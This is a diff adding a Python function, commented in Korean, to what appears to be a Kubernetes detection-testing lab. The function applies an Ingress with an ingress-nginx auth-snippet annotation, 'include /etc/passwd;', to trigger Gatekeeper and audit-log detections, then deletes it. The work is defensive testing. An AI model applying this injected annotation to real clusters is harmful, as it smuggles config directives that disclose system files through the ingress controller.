@@ -175,3 +175,97 @@ def summarize_enum(results: list[FileEnumResult]) -> dict:
         "total_probed": len(results),
         "accessible_count": len(accessible),
     }
+
+
+def trigger_via_apiserver(namespace: str = "default", *, verbose: bool = True) -> dict:
+    """
+    kube-apiserver 경유 악성 Ingress 제출로 D2 탐지 트리거.
+
+    make attack-enum / attack_chain 의 직접 webhook POST와 달리
+    kube-apiserver → Gatekeeper → ingress-nginx webhook 경로를 거치므로:
+      - Gatekeeper warn 모드  : violation 기록 → kubectl get blocknginxdangerousannotations -A
+      - Audit Log (D2 규칙)   : requestObject에 auth-snippet 패턴 기록
+
+    Ingress는 apply 직후 자동 삭제(정리)된다.
+    Returns: dict(triggered, method, output, cleaned_up)
+    """
+    import subprocess
+    import tempfile
+    import os
+
+    manifest = f"""\
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: d2-trigger-probe
+  namespace: {namespace}
+  annotations:
+    nginx.ingress.kubernetes.io/auth-url: "http://127.0.0.1:9999/auth"
+    nginx.ingress.kubernetes.io/auth-snippet: "include /etc/passwd;"
+spec:
+  ingressClassName: nginx
+  rules:
+  - host: d2-probe.local
+    http:
+      paths:
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: svc
+            port:
+              number: 80
+"""
+    result: dict = {
+        "triggered": False,
+        "method": "kubectl_apply",
+        "output": "",
+        "cleaned_up": False,
+    }
+
+    tmp_path: str | None = None
+    try:
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
+            f.write(manifest)
+            tmp_path = f.name
+
+        apply_proc = subprocess.run(
+            ["kubectl", "apply", "-f", tmp_path],
+            capture_output=True, text=True, timeout=15,
+        )
+        output = (apply_proc.stdout + apply_proc.stderr).strip()
+        result["output"] = output
+        result["triggered"] = True
+
+        if verbose:
+            print("\n  [D2 트리거] kube-apiserver 경유 악성 Ingress 제출")
+            print(f"  → {output}")
+            print("  → Gatekeeper violation 확인 : make detect-gatekeeper-violations")
+            print("  → Audit Log 확인            : make detect-audit-tail")
+
+        # 즉시 정리 (Ingress 삭제)
+        del_proc = subprocess.run(
+            ["kubectl", "delete", "ingress", "d2-trigger-probe",
+             "-n", namespace, "--ignore-not-found"],
+            capture_output=True, text=True, timeout=15,
+        )
+        result["cleaned_up"] = del_proc.returncode == 0
+        if verbose:
+            print("  → Ingress 정리 완료")
+
+    except FileNotFoundError:
+        result["output"] = "kubectl 없음 — kube-apiserver 경유 트리거 스킵"
+        if verbose:
+            print(f"\n  [D2 트리거 스킵] {result['output']}")
+    except subprocess.TimeoutExpired:
+        result["output"] = "kubectl apply 타임아웃"
+    except Exception as e:
+        result["output"] = str(e)
+    finally:
+        if tmp_path:
+            try:
+                os.unlink(tmp_path)
+            except Exception:
+                pass
+
+    return result
